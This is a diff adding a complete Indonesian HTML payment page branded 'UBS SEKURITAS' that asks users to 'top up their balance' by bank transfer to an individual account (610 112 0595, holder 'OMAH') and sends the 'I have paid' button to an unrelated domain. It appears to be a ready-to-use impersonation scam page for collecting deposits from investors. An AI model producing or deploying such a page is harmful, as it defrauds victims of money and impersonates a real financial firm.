@@ -1,0 +1,282 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ardata | Isi Ulang Saldo</title>
+<style>
+*{box-sizing:border-box}
+:root{
+  --teal:#32b9b5;
+  --cyan:#20d5d5;
+  --yellow:#ffc629;
+  --text:#f5f8f8;
+}
+body{
+  margin:0;
+  min-height:100vh;
+  font-family:Arial,Helvetica,sans-serif;
+  color:var(--text);
+  background:
+    repeating-radial-gradient(
+      ellipse at 100% 0%,
+      transparent 0 14px,
+      rgba(46,174,163,.55) 15px 18px,
+      transparent 19px 27px
+    ),
+    radial-gradient(ellipse at 90% 20%,#254b49,transparent 55%),
+    #102426;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  padding:28px 16px;
+}
+.page{width:100%;max-width:440px}
+.brand{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:9px;
+  margin-bottom:24px;
+  color:#61d0cb;
+  font-size:31px;
+  font-weight:800;
+}
+.logo{width:44px;height:31px;position:relative}
+.logo span{
+  position:absolute;width:20px;height:13px;
+  border-radius:4px;transform:skew(-18deg)
+}
+.logo span:nth-child(1){background:#ffd12c;left:2px;top:0}
+.logo span:nth-child(2){background:#ff5c49;right:0;top:0}
+.logo span:nth-child(3){
+  background:#32c4bc;width:39px;left:0;bottom:2px
+}
+.panel{
+  background:rgba(12,31,33,.94);
+  border:1px solid #34595a;
+  border-radius:22px;
+  padding:26px 22px 27px;
+  box-shadow:0 18px 60px #07161755;
+}
+.eyebrow{
+  text-align:center;color:var(--cyan);
+  font-size:11px;font-weight:bold;
+  letter-spacing:2px;margin-bottom:9px
+}
+h1{text-align:center;font-size:25px;margin:0 0 10px}
+.intro{
+  text-align:center;color:#c5d7d8;
+  font-size:13px;line-height:1.6;
+  margin:0 auto 25px
+}
+label{
+  display:block;font-size:13px;
+  font-weight:bold;margin-bottom:8px
+}
+input{
+  width:100%;height:49px;
+  border:1px solid #496768;
+  background:#0b1b1d;border-radius:10px;
+  padding:0 14px;color:white;font-size:16px;
+  outline:none
+}
+input:focus{border-color:var(--teal)}
+.presets{
+  display:grid;grid-template-columns:repeat(3,1fr);
+  gap:8px;margin:10px 0 22px
+}
+.presets button{
+  height:41px;border-radius:9px;
+  border:1px solid #476466;background:#203739;
+  color:white;font-size:12px;cursor:pointer
+}
+.presets button.active{
+  border-color:var(--cyan);color:var(--cyan);
+  background:#193638
+}
+.bank{
+  border:1px solid #36595a;background:#203638;
+  border-radius:13px;padding:17px 16px 15px;
+  margin-bottom:20px
+}
+.bank-title{
+  font-size:11px;color:#c0d8da;
+  letter-spacing:.8px;margin-bottom:13px
+}
+.field{
+  margin-bottom:12px;color:#c4d7d9;
+  font-size:13px;line-height:1.5
+}
+.field strong{
+  display:block;color:white;font-size:14px;margin-top:2px
+}
+.account-row{display:flex;align-items:center;gap:12px}
+.account-row .field{flex:1;margin-bottom:12px}
+.small-copy{
+  border:1px solid var(--cyan);border-radius:8px;
+  background:transparent;color:var(--cyan);
+  padding:11px 13px;cursor:pointer
+}
+.total{
+  display:flex;align-items:center;
+  justify-content:space-between;
+  border-top:1px solid #315253;
+  border-bottom:1px solid #315253;
+  padding:16px 0;margin-bottom:17px;
+  font-size:13px;color:#d0dfe0
+}
+.total strong{font-size:21px;color:var(--yellow)}
+.action{
+  width:100%;height:46px;border:0;
+  border-radius:9px;background:var(--teal);
+  color:#061d1f;font-weight:bold;
+  font-size:13px;cursor:pointer;margin-bottom:16px
+}
+.action:hover{filter:brightness(1.08)}
+.note{
+  text-align:center;color:#b9d0d2;
+  font-size:11px;line-height:1.6;
+  margin:3px 7px 0
+}
+@media(max-width:420px){
+  .panel{padding:23px 16px;border-radius:18px}
+  h1{font-size:23px}
+  .total strong{font-size:19px}
+}
+</style>
+</head>
+<body>
+<main class="page">
+
+  <div class="brand">
+    <div class="logo">
+      <span></span><span></span><span></span>
+    </div>
+    <span>UBS SEKURITAS</span>
+  </div>
+
+  <section class="panel">
+    <div class="eyebrow">LAYANAN PEMBAYARAN</div>
+    <h1>Isi Ulang Saldo</h1>
+    <p class="intro">
+      Masukkan nominal saldo yang ingin Anda isi,
+      lalu ikuti petunjuk transfer di bawah.
+    </p>
+
+    <label for="amount">Nominal isi ulang (Rp)</label>
+    <input id="amount" type="number"
+      min="1000" step="1000" value="45000">
+
+    <div class="presets">
+      <button class="active" data-amount="45000">Rp45.000</button>
+      <button data-amount="200000">Rp200.000</button>
+      <button data-amount="500000">Rp500.000</button>
+    </div>
+
+    <div class="bank">
+      <div class="bank-title">INFORMASI TRANSFER BANK</div>
+
+      <div class="field">
+        Bank tujuan
+        <strong>HIBANK atau BANK MAYORA</strong>
+      </div>
+
+      <div class="account-row">
+        <div class="field">
+          Nomor rekening
+          <strong id="account">610 112 0595</strong>
+        </div>
+        <button class="small-copy" id="copyAccount">
+          Salin
+        </button>
+      </div>
+
+      <div class="field">
+        Nama pemilik rekening
+        <strong>OMAH</strong>
+      </div>
+    </div>
+
+    <div class="total">
+      <span>Total transfer</span>
+      <strong id="total">Rp 45.000</strong>
+    </div>
+
+    <button class="action" id="copyAmount">
+      Salin Nominal Transfer
+    </button>
+
+    <button class="action" id="paid">
+      Saya Sudah Membayar
+    </button>
+
+    <p class="note">
+      Pastikan nama penerima dan nomor rekening benar
+      sebelum melakukan transfer. Simpan bukti pembayaran
+      Anda. Konfirmasi pada halaman ini tidak otomatis
+      memverifikasi atau menambahkan saldo akun.
+    </p>
+  </section>
+</main>
+
+<script>
+const amount = document.getElementById('amount');
+const total = document.getElementById('total');
+
+const formatRupiah = n =>
+  'Rp ' + (Number(n) || 0).toLocaleString('id-ID');
+
+function updateTotal() {
+  total.textContent = formatRupiah(amount.value);
+
+  document.querySelectorAll('.presets button')
+    .forEach(button => {
+      button.classList.toggle(
+        'active',
+        Number(button.dataset.amount) === Number(amount.value)
+      );
+    });
+}
+
+amount.addEventListener('input', updateTotal);
+
+document.querySelectorAll('.presets button')
+  .forEach(button => {
+    button.addEventListener('click', () => {
+      amount.value = button.dataset.amount;
+      updateTotal();
+    });
+  });
+
+async function copyText(text, message) {
+  try {
+    await navigator.clipboard.writeText(text);
+    alert(message);
+  } catch (error) {
+    prompt('Salin teks berikut:', text);
+  }
+}
+
+document.getElementById('copyAccount')
+  .addEventListener('click', () => {
+    copyText('6101120595', 'Nomor rekening disalin.');
+  });
+
+document.getElementById('copyAmount')
+  .addEventListener('click', () => {
+    copyText(
+      String(Number(amount.value) || 0),
+      'Nominal transfer disalin.'
+    );
+  });
+
+document.getElementById('paid')
+  .addEventListener('click', () => {
+    window.location.href = 'https://accountplatform169.com';
+  });
+
+</script>
+</body>
+</html>
